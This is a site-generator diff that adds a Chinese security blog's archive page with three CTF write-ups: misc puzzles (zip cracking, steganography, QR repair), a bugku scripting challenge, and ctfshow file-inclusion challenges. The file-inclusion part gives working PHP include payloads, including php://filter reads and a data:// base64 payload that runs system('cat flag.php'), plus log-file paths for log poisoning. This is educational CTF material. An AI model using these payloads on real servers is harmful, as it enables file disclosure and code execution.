@@ -1,23 +1,1537 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.2.0">
 
-{% block title %}{{ config.title }}{% if theme.index_with_subtitle and config.subtitle %} - {{config.subtitle }}{% endif %}{% endblock %}
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hackerone-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hackerone-16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="msvalidate.01" content="237E6FD4C952815B9A0DDB67FAB1FF12">
+  <meta name="baidu-site-verification" content="code-LhZrqnckkC">
 
-{% block page_class %}
-  {% if is_home() %}page-home{% endif -%}
-{% endblock %}
+<link rel="stylesheet" href="/css/main.css">
 
-{% block content %}
-  <section id="posts" class="posts-expand">
-    {% for post in page.posts %}
-      {{ post_template.render(post, true) }}
-    {% endfor %}
-  </section>
 
-  {% include '_partials/pagination.swig' %}
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(false) }}
-{% endblock %}
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"eur1ka.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="网络信息安全，责任重大，使命光荣。">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Eureka&#39;s Blog">
+<meta property="og:url" content="https://eur1ka.github.io/archives/page/3/index.html">
+<meta property="og:site_name" content="Eureka&#39;s Blog">
+<meta property="og:description" content="网络信息安全，责任重大，使命光荣。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="nnnpc、commit、Eureka">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://eur1ka.github.io/archives/page/3/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"archives/page/3/index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Eureka's Blog - 默安科技逐日实验室</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Eureka's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">默安科技逐日实验室</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="nnnpc、commit、Eureka"
+      src="/images/head.png">
+  <p class="site-author-name" itemprop="name">nnnpc、commit、Eureka</p>
+  <div class="site-description" itemprop="description">网络信息安全，责任重大，使命光荣。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:1695672857@qq.com" title="E-Mail → mailto:1695672857@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://eur1ka.github.io/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eureka's Blog">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Eureka's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/" class="post-title-link" itemprop="url">2022暴龙杯wp(misc)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-08-07 15:07:00" itemprop="dateCreated datePublished" datetime="2022-08-07T15:07:00+08:00">2022-08-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-09-21 11:25:57" itemprop="dateModified" datetime="2022-09-21T11:25:57+08:00">2022-09-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>签到</p>
+<p>下下来一个压缩包，一张png图片，拖到浏览器中发现是apng，用工具分离出来就好</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image002.gif" alt="图片"></p>
+<p>得到flag，BLCTF{Y0u_Kn0w_Apng!!!!!}</p>
+<p>Ez_zip</p>
+<p>打开发现是一个无限套娃的压缩包，直接用脚本跑</p>
+<p>from zipfile import *</p>
+<p>from os import *</p>
+<p>init_name &#x3D; ‘98895’</p>
+<p>name_list &#x3D; []</p>
+<p>path &#x3D; getcwd()</p>
+<p>zip_name &#x3D; init_name</p>
+<p>while True:</p>
+<p>  try:</p>
+<p>   name_list.append(zip_name)</p>
+<p>   file &#x3D; ZipFile(zip_name+’.zip’, ‘r’)</p>
+<p>   if(file):</p>
+<p>​     file.extractall(path, pwd&#x3D;zip_name.encode(‘utf-8’))</p>
+<p>​     zip_name &#x3D; file.namelist()[0][:-4]</p>
+<p>   else:</p>
+<p>​     continue</p>
+<p>  except:</p>
+<p>   break</p>
+<p>print(name_list)</p>
+<p>跑出来最后一个flag.zip,发现是加密文件，调整长度进行爆破</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image004.gif" alt="图片"></p>
+<p>发现密码是999999，解压出来一个flag.png拖入浏览器发现还是apng，分离</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image006.gif" alt="图片"></p>
+<p>得flag，BLCTF{731b9cdf-6022-4429-8949-b1e4a757db30}</p>
+<p>嫌疑人X</p>
+<p>首先打开压缩包，会发现info文件夹下有个隐藏文件，把隐藏按钮打开就好</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image008.gif" alt="图片"></p>
+<p>发现这个诺基亚.rar和上一级文件夹中pcap.rar都是加密文件</p>
+<p>看了看发现只有一张证件照是有相关信息的</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image010.gif" alt="图片"></p>
+<p>根据一般的密码的设置套路，名字+生日，试了好久还是试不出，根据提示知道了诺基亚的密码是Lx1x9x0x0x</p>
+<p>立马想到密码是Lw19970608</p>
+<p>解开诺基亚.rar</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image012.gif" alt="图片"></p>
+<p>是一张诺基亚的照片，拖进winhex看看</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image014.gif" alt="图片"></p>
+<p>发现有个压缩包，foremost分离出来，发现要密码</p>
+<p>winhex修改伪加密</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image016.gif" alt="图片"></p>
+<p>打开秘密.txt发现是九键键盘解密</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image018.gif" alt="图片"></p>
+<p>对照着那张诺基亚三个五代表l，四个七代表s，以此类推，出来的结果是</p>
+<p>lsjddwyyyyy，这一看就是另一个rar的密码了</p>
+<p>wireshark分析pcapng文件</p>
+<p>在udp追踪流0的时候发现flag</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image020.gif" alt="图片"></p>
+<p>最终答案是BLCTF{YOU_ARE_A_GREAT_ASSISTANT}</p>
+<p>BitMask</p>
+<p>压缩包直接是加密的，根据注释提示是六位密码</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image022.gif" alt="图片"></p>
+<p>直接先六位纯数字爆破</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image024.gif" alt="图片"></p>
+<p>密码是21964</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image026.gif" alt="图片"></p>
+<p>发现了被污染的二维码，用网站手拼二维码进行扫描</p>
+<p><a target="_blank" rel="noopener" href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a></p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image028.gif" alt="图片"></p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image030.gif" alt="图片"></p>
+<p>解出457c，把原图zsteg的时候发现应该里面还有一张图片，但是分离不出来</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image032.gif" alt="图片"></p>
+<p>猜测是有损坏，放入winhex搜索IEND</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image034.gif" alt="图片"></p>
+<p>第一个IEND处发现png的文件头没有补齐，将它分离出来并且用8950补齐头部</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image036.gif" alt="图片"></p>
+<p>保存下来一张新的二维码，发现扫不了，应该是对掩码进行了调整</p>
+<p>还是用之前的那个网站对新保存下来的这张二维码进行掩码修复，顺序是076</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image038.gif" alt="图片"></p>
+<p>扫出来的结果是前半截的flag，在原图binwalk的时候发现1675这个文件用记事本打开的时候是一串编码</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image040.gif" alt="图片"></p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image042.gif" alt="图片"></p>
+<p>对编码进行解码，将该二进制从头部一位一位剔除进行二进制转换</p>
+<p><img src="/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image044.gif" alt="图片"></p>
+<p>得到flag后半部分，拼接起来BLCTF{675af7c9-fb5b-xxxx-9fde-415a5253db08}</p>
+<p>想到之前有个手拼扫描出来的四位数457c，应该就是这四个xxxx了，拼接起来得flag</p>
+<p>BLCTF{675af7c9-fb5b-457c-9fde-415a5253db08}</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://eur1ka.github.io/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eureka's Blog">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Eureka's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/" class="post-title-link" itemprop="url">bugku 秋名山车神</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-08-06 21:23:00 / 修改时间：21:23:42" itemprop="dateCreated datePublished" datetime="2022-08-06T21:23:00+08:00">2022-08-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/web%E9%A2%98%E9%9B%86/" itemprop="url" rel="index"><span itemprop="name">web题集</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="bugku-秋名山车神"><a href="#bugku-秋名山车神" class="headerlink" title="bugku 秋名山车神"></a>bugku 秋名山车神</h1><p><em><strong>get新知识：一些有关python爬虫的基本知识</strong></em></p>
+<h2 id="解题部分"><a href="#解题部分" class="headerlink" title="解题部分"></a>解题部分</h2><p>​			<img src="/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/image-20220805231551976.png" alt="image-20220805231551976"></p>
+<p>题目中都是这样的大数字进行计算，并且需要短时间内计算，所以这不得不使用脚本进行解题，脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#bugku 秋名山车神 --爬虫练习</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s=requests.Session()</span><br><span class="line">url=<span class="string">&#x27;http://114.67.175.224:18569/&#x27;</span>                              <span class="comment">#网页的url</span></span><br><span class="line">r=s.get(url)                                                    <span class="comment">#以get的方式访问网站</span></span><br><span class="line">r.encoding = <span class="string">&#x27;utf-8&#x27;</span>                                            <span class="comment">#设置编码格式</span></span><br><span class="line">a=r.text                                                        <span class="comment">#将页面定义给a</span></span><br><span class="line"><span class="comment">#print(a)</span></span><br><span class="line"></span><br><span class="line">n = re.findall(<span class="string">r&#x27;\d.*?=&#x27;</span>,a)[<span class="number">0</span>]                                  <span class="comment">#通过re正则匹配出a中的数字</span></span><br><span class="line"><span class="comment">#print(n)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=re.sub(<span class="string">&quot;[=]&quot;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">str</span>(n))                                       <span class="comment">#去掉那个多余的&#x27;=&#x27;</span></span><br><span class="line"><span class="comment">#print(c)</span></span><br><span class="line">c=<span class="built_in">eval</span>(c)                                                         <span class="comment">#执行代码==》计算</span></span><br><span class="line"></span><br><span class="line">o = s.post(url,data=&#123;<span class="string">&#x27;value&#x27;</span>:c&#125;)  <span class="comment">#提交结果</span></span><br><span class="line"><span class="built_in">print</span> (o.text)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<p><img src="/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/image-20220805231808660.png" alt="image-20220805231808660"></p>
+<pre><code> ## 	脚本分析
+</code></pre>
+<p>个人理解脚本分为三部分：1、获取数据    2、正则读取数据并处理   3、传输数据</p>
+<p>1、获取数据</p>
+<p>这部分利用了requests类的内置的方法，其中值得一提的是s&#x3D;requests.Session()这部分，必须有目的是保持会话</p>
+<p><img src="/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/image-20220805231827926.png" alt="image-20220805231827926"></p>
+<p>2、正则读取数据并处理</p>
+<p>这里用了两个re库中的两个内置函数</p>
+<p>​	1、在import re中，(re.findall(pattern, string, flags&#x3D;0))：返回string中所有与pattern相匹配的全部<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>，得到数组</p>
+<p>​	2、re.sub是个正则表达式方面的函数，用来实现通过正则表达式，实现比普通字符串的replace更加强大的替换功能；</p>
+<p><img src="/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/image-20220805231838154.png" alt="image-20220805231838154"></p>
+<p>3、传输数据</p>
+<p>题目中提示用post传输所以</p>
+<p><img src="/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/image-20220805231848266.png" alt="image-20220805231848266"></p>
+<p>特别感谢：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64815693/article/details/125539527?spm=1001.2014.3001.5502">(27条消息) Bugku 秋名山车神_没有名字了。。的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43088815/article/details/90214217">(27条消息) python re模块(正则表达式) sub()函数详解_leo的学习之旅的博客-CSDN博客_python sub函数</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jly164260234/article/details/83215924">(27条消息) Python—re.findall的用法_扫地di的博客-CSDN博客_python re.findall()用法</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://eur1ka.github.io/2022/07/25/ctfshow_web78~web81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eureka's Blog">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Eureka's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/07/25/ctfshow_web78~web81/" class="post-title-link" itemprop="url">文件包含入门（web78~web81）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-07-25 23:45:00 / 修改时间：23:44:56" itemprop="dateCreated datePublished" datetime="2022-07-25T23:45:00+08:00">2022-07-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/ctfshow%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">ctfshow刷题</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="ctfshow（web78-web81）-文件包含入门"><a href="#ctfshow（web78-web81）-文件包含入门" class="headerlink" title="ctfshow（web78~web81） 文件包含入门"></a>ctfshow（web78~web81） 文件包含入门</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>​             在这些题中用到了许多php伪协议，这里写两个做题中比较常用的，具体请看博客（<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53142368/article/details/116594299">(21条消息) PHP伪协议_H0ne的博客-CSDN博客_php伪协议</a>）</p>
+<p>1、php伪协议：data:&#x2F;&#x2F;碰到file_get_contents()，include（）来用；</p>
+<p><strong>个人感觉data比较万能所以再没有头绪的时候可以尝试一下；</strong></p>
+<p>2、php:&#x2F;&#x2F;input （读取POST数据）</p>
+<p>碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
+<p>3、php:&#x2F;&#x2F;filter（本地磁盘文件进行读取）（filter:&#x2F;&#x2F; 感觉是遇到include()函数使用）</p>
+<p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。</p>
+<ul>
+<li><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<p>传输后获得一串base64加密过后的编码。解密即可；</p>
+<ul>
+<li><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题对输入进行了一定的过滤，即不能包含的url中不能直接出现php，可以使用data协议，进行base64加密即可</p>
+<p>​			payload:</p>
+<p>file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</p>
+<p>之后再查看器中进行查看；</p>
+<p><img src="/ctfshow_web78~web81/image-20220724155731962.png" alt="image-20220724155731962"></p>
+<ul>
+<li><h2 id="web80-81"><a href="#web80-81" class="headerlink" title="web80-81"></a>web80-81</h2></li>
+</ul>
+<p>循序渐进将data协议也禁止了，所以我们可以使用包含日志文件来获取flag</p>
+<p>（我们可以通过响应头获取有关中间件的信息，以此判断日志文件的路径）</p>
+<p><em><strong>tips:</strong></em></p>
+<p><strong>nginx日志在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong></p>
+<p><strong>apache日志在类似目录下&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log</strong></p>
